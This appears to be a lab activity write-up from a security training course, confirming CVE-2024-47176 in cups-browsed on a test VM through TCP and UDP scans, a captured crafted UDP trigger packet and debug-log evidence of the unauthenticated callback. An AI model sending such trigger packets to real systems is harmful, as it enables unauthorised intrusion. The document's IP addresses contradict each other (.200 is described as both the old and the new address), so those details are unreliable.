# Activity: CUPS Service Discovery

## Summary

Following deletion of the original disposable VM and re-cloning from the master VM's post-CUPS-installation snapshot, the disposable VM's address changed from 192.168.144.200 to **192.168.144.200**. This activity re-establishes the CUPS/cups-browsed attack surface against the new address: confirming the rest of the previously-known service baseline is unchanged, confirming CUPS itself is invisible to a full TCP port sweep (since `cupsd`'s TCP interface is loopback-only), confirming it is visible via UDP scanning, and confirming, via `cups-browsed`'s own debug log, that the CVE-2024-47176 unauthenticated callback and local-queue-creation behaviour fires exactly as expected.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.200 |
| Attacker | Kali VM on the same host-only lab network |
| Tooling | nmap, nc, journalctl (target-side debug log) |

## Reconnaissance

### Step 1: Full TCP re-scan against the new address

```bash
nmap -p- -T4 192.168.144.200
```

Result: identical set of 15 well-known ports and 6 high/ephemeral RPC ports as the original `r-02- reconnaissance-and-service-enumeration.md` baseline. **Port 631 does not appear.** This is expected and correct: `cupsd`'s TCP listener is bound to `127.0.0.1`/`::1` only (confirmed during CUPS installation validation), so it is invisible to any external TCP scan regardless of the service being genuinely present and running.

### Step 2: UDP scan

```bash
nmap -sU --top-ports 20 192.168.144.200
```

```
631/udp   open|filtered ipp
```

Unlike the TCP side, port 631/udp **is** visible externally, since `cups-browsed` binds its control socket to `UDP 0.0.0.0:631` (all interfaces), not loopback-only. This is a genuinely useful teaching point in its own right: a single logical service (CUPS/cups-browsed) can present completely different visibility depending on which transport protocol and which of its component processes is examined, TCP scanning alone would conclude no print service exists on this host at all, which is wrong.

Two minor UDP state differences were observed relative to the original `r-02` UDP baseline (`139/udp` and `1434/udp` shifted between `closed` and `open|filtered`); given the already-established ambiguity of `open|filtered` UDP results, this is not treated as a meaningful finding, likely ordinary scan-to-scan timing variance rather than a genuine configuration change.

### Step 3: Callback confirmation via debug log

An initial re-run of the manual UDP callback test (identical packet to the one validated on the previous VM instance) initially appeared to produce no response on a plain `nc` listener. Rather than concluding the vulnerability was absent, `cups-browsed` debug logging was enabled on the target (`DebugLogging file stderr` in `/etc/cups/cups-browsed.conf`, service restarted) to observe its actual behaviour directly:

```bash
sudo sed -i 's/# DebugLogging file stderr/DebugLogging file stderr/' /etc/cups/cups-browsed.conf
sudo systemctl restart cups-browsed
sudo journalctl -u cups-browsed -f
```

A `tcpdump` capture on the target confirmed the crafted UDP packet was arriving correctly at the network level regardless:

```
00:48:32 eth0 In IP 192.168.144.129.34673 > 192.168.144.200.631: UDP, length 72
  0 3 http://192.168.144.129:8000/printers/test "Office HQ" "Test Printer"
```

Once the debug log confirmed the service had fully reached its `listening` state (the first attempt occurred while `cups-browsed` was still completing its own IPP subscription/Avahi setup on startup), resending the identical packet produced clear, conclusive evidence in the debug log:

```
get-printer-attributes IPP request failed:
  - Required IPP attribute printer-make-and-model not found
No further fallback available, giving up
Removing local CUPS queue Test_Printer_192_168_144_129 (ipp://192.168.144.129:8000/printers/test).
```

**This is stronger, more definitive confirmation than the raw HTTP callback observed on the previous VM instance.** The log shows `cups-browsed` did all of the following, entirely unauthenticated, in response to a single crafted UDP packet: created a local CUPS print queue named `Test_Printer_192_168_144_129`, issued a `get-printer-attributes` IPP request to the attacker-specified URL, and only removed the queue because the response it received (from a plain `nc` listener, not a real IPP server) lacked the required `printer-make-and-model` attribute. This confirms conclusively that the full chain documented in `e-12- cups-full-rce-chain.md` requires a genuine IPP-protocol-compliant server able to answer with a valid, attacker-crafted `printer-make-and-model` attribute, a plain raw-socket listener can trigger the callback but cannot complete the chain, exactly consistent with why `e-12` specifies using a proper IPP server library/PoC rather than raw sockets for the full exploitation activity.

## Scenario Content: Legitimate Printer Queue

Separate from the exploit-generated queue (`Pwned_Printer_...`, created and torn down during exploitation in `e-12- cups-full-rce-chain.md`), a legitimate, pre-existing printer queue was deliberately configured on this VM to give the print server genuine organisational presence, consistent with the project's approach of adding scenario realism to every service (as with the FTP `note` breadcrumb in `r-04`).

**Setup** (run once per VM; applied to both master and the current disposable VM):
```bash
sudo lpadmin -p HR-LaserJet-2F -E -v file:///dev/null -m drv:///sample.drv/generic.ppd
echo "Q3 Budget Review - Finance Dept - CONFIDENTIAL" > /tmp/Q3_Budget_Review.txt
lp -d HR-LaserJet-2F /tmp/Q3_Budget_Review.txt
```

**What a student sees during normal enumeration:**
```bash
lpstat -p
```
```
printer HR-LaserJet-2F is idle.  enabled since Tue 25 Aug 2026 01:35:48 AM BST
```

```bash
lpstat -W completed -o HR-LaserJet-2F
```
```
HR-LaserJet-2F-2        uow-admin         1024   Tue 25 Aug 2026 01:35:48 AM BST
```

The queue name (`HR-LaserJet-2F`, suggesting HR department, 2nd floor) and the completed job's filename reference give the print server a plausible organisational identity, and the job history is a minor narrative breadcrumb in the same spirit as the FTP note, though it does not currently link to any further exploit path the way the FTP note does. This queue is entirely legitimate CUPS configuration, unrelated to the vulnerability; it existed before, and is unaffected by, the exploit activity in `e-12`.

## Outcome

Confirmed the CVE-2024-47176 vulnerability is present and fully functional on the re-cloned disposable VM (192.168.144.200), with debug-log evidence showing the complete unauthenticated queue-creation and callback sequence, not merely the HTTP request alone. Confirmed CUPS is undetectable via TCP scanning but detectable via UDP scanning, a valuable methodological point. All other previously-known services remain consistent with the `r-02` baseline. All future activity files referencing this target should use `192.168.144.200`, not `.131`.

## Teaching Notes

Two lessons stand out from this troubleshooting process itself, worth preserving even though they emerged from debugging rather than a clean first pass: first, a service can be mid-initialization when a probe is sent, and an apparent negative result immediately after a service restart should prompt a retry once the service is confirmed fully ready (visible via its own log output), rather than an immediate conclusion that a previously-validated vulnerability has stopped working. Second, a raw-socket listener is sufficient to prove a callback/trigger mechanism exists, but is not a substitute for a real IPP server when the next stage of an attack chain depends on returning protocol-correct, attacker-crafted attribute data, the failure mode here (`Required IPP attribute printer-make-and-model not found`) is precisely the gap the full exploitation activity's malicious IPP server is built to fill.

## Lab Dependencies

**Prerequisite exploit(s):** None; supersedes the target address used in `r-12- cups-print-service-reconnaissance.md` and `e-12- cups-full-rce-chain.md`, which were validated against the now-deleted 192.168.144.200 instance
**Required starting access:** Network access to the target from Kali
**Starting account:** None
**Resulting access:** N/A (reconnaissance/confirmation only)
**Provides access for:** Confirms the precondition for `e-12- cups-full-rce-chain.md` against the current disposable VM address
**Suggested teaching level:** Level 5–6 (TCP vs UDP service visibility, and diagnosing an apparent tool failure via service-side logging rather than assuming a vulnerability is absent)
